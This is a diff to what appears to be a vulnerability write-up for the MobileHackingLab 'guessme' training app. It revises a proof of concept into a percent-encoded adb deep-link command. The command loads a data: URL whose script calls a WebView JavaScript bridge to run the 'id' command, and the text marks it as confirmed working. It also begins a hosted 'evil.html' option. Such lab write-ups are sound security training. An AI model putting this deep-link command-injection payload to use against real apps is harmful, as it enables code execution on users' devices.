@@ -55,12 +55,11 @@ webView.loadUrl(fullUrl);   // attacker-controlled
 
 ### Proof of Concept
 
-**Option A — self-contained `data:` URL (no server needed).** The `url` param only has to *end with* `mobilehackinglab.com` (see GM-02); put that literal in an HTML comment:
-```bash
-adb shell am start -a android.intent.action.VIEW \
-  -d 'mhl://mobilehackinglab?url=data:text/html,<script>document.title=AndroidBridge.getTime("id")</script><!--mobilehackinglab.com-->' \
-  com.mobilehackinglab.guessme
+**Option A — self-contained `data:` URL (no server needed).** The `url` param only has to *end with* `mobilehackinglab.com` (see GM-02), so append `#mobilehackinglab.com`. The **entire `data:` URL must be percent-encoded** — otherwise `adb shell` hands `(`, `)`, `<`, `>`, `"` to the device's `/system/bin/sh`, which fails with `syntax error: unexpected '('`. Encoded form that renders the `id` output on screen (confirmed working):
+```powershell
+adb shell am start -n com.mobilehackinglab.guessme/.WebviewActivity -a android.intent.action.VIEW -d 'mhl://mobilehackinglab?url=data%3Atext%2Fhtml%2C%253Cbody%253E%253C%252Fbody%253E%253Cscript%253Edocument.body.innerText%253DAndroidBridge.getTime%2528%2522id%2522%2529%253C%252Fscript%253E%2523mobilehackinglab.com'
 ```
+(`%2528`=`(`, `%2522`=`"`, `%253C`=`<`, `%2520`=space, `%252F`=`/`. Use PowerShell with single quotes; keep the payload short to avoid arg corruption in transit. The raw un-encoded form only works when the link is *tapped*, not via `adb shell`.)
 
 **Option B — hosted page (most reliable; cleartext is allowed).** Host `evil.html`:
 ```html
